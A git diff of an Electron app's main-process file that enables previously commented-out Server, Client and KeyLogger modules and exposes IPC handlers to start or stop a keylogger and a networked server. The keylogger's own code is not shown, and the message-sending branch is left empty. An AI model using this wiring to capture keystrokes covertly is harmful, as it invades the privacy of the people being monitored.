@@ -1,10 +1,10 @@
 import { app, BrowserWindow, ipcMain } from "electron";
 import * as path from "path";
 
-// import Server = require('./modules/server');
-// import Client = require('./modules/client');
+import Server = require('./modules/server');
+import Client = require('./modules/client');
 
-// import KeyLogger = require('./modules/keylogger');
+import KeyLogger = require('./modules/keylogger');
 
 // Handle creating/removing shortcuts on Windows when installing/uninstalling.
 if (require('electron-squirrel-startup')) { // eslint-disable-line global-require
@@ -75,64 +75,64 @@ app.on('activate', () => {
 
 // In this file you can include the rest of your app's specific main process
 // code. You can also put them in separate files and import them here.
-// const server = new Server(sendMessageToMainWindow);
-// const client = new Client(sendMessageToMainWindow);
+const server = new Server(sendMessageToMainWindow);
+const client = new Client(sendMessageToMainWindow);
 
-// const keylogger = new KeyLogger(sendMessageToMainWindow);
+const keylogger = new KeyLogger(sendMessageToMainWindow);
 
-// let currentInstance = "Standby";
+let currentInstance = "Standby";
 
-// function sendMessageToMainWindow(message) {
-// 	if (!domHasLoaded)return "DOM HASN'T LOADED YET!";
+function sendMessageToMainWindow(message) {
+	if (!domHasLoaded)return "DOM HASN'T LOADED YET!";
 
-// 	mainWindow.webContents.send("mainWindowMsg", message);
+	mainWindow.webContents.send("mainWindowMsg", message);
 
-// 	return "Sent message!";
-// }
+	return "Sent message!";
+}
 
-// ipcMain.handle("mainWindow", async (e, ...args) => {
-// 	return await ipcMethods.exec(args);
-// });
+ipcMain.handle("mainWindow", async (e, ...args) => {
+	return await ipcMethods.exec(args);
+});
 
-// const ipcMethods = {
-// 	server: {
-// 		start: function(port, host, password) {
-// 			return server.start(port, host, password);
-// 		},
-// 		stop: function() {
-// 			return server.stop();
-// 		},
-// 		sendMessage(message) {
-// 			return server.sendMessageToAll(message);
-// 		}
-// 	},
-// 	keyLogger: {
-// 		start: function() {
-// 			return keylogger.start();
-// 		},
-// 		stop: function() {
-// 			return keylogger.stop();
-// 		}
-// 	},
-// 	exec: async function(args) {
-// 		const method = args[0];
-// 		const extraArgs = args[1];
+const ipcMethods = {
+	server: {
+		start: function(port, host, password) {
+			return server.start(port, host, password);
+		},
+		stop: function() {
+			return server.stop();
+		},
+		sendMessage(message) {
+			return server.sendMessageToAll(message);
+		}
+	},
+	keyLogger: {
+		start: function() {
+			return keylogger.start();
+		},
+		stop: function() {
+			return keylogger.stop();
+		}
+	},
+	exec: async function(args) {
+		const method = args[0];
+		const extraArgs = args[1];
 
-// 		switch (method) {
-// 			case "start server":
-// 				if (currentInstance == "Client")
-// 					return "You can't be a server when you're a client!";
+		switch (method) {
+			case "start server":
+				if (currentInstance == "Client")
+					return "You can't be a server when you're a client!";
 
-// 				currentInstance = "Server";
+				currentInstance = "Server";
 
-// 				return this.server.start(extraArgs[0], extraArgs[1], extraArgs[2]);
-// 			case "send message":
-// 				if (currentInstance == "Server") {
+				return this.server.start(extraArgs[0], extraArgs[1], extraArgs[2]);
+			case "send message":
+				if (currentInstance == "Server") {
 				
-// 				}
-// 				break;
-// 			default:
-// 				return "Unknown Method. Better luck next time ¯\\_(ツ)_/¯";
-// 		}
-// 	}
-// };
+				}
+				break;
+			default:
+				return "Unknown Method. Better luck next time ¯\\_(ツ)_/¯";
+		}
+	}
+};
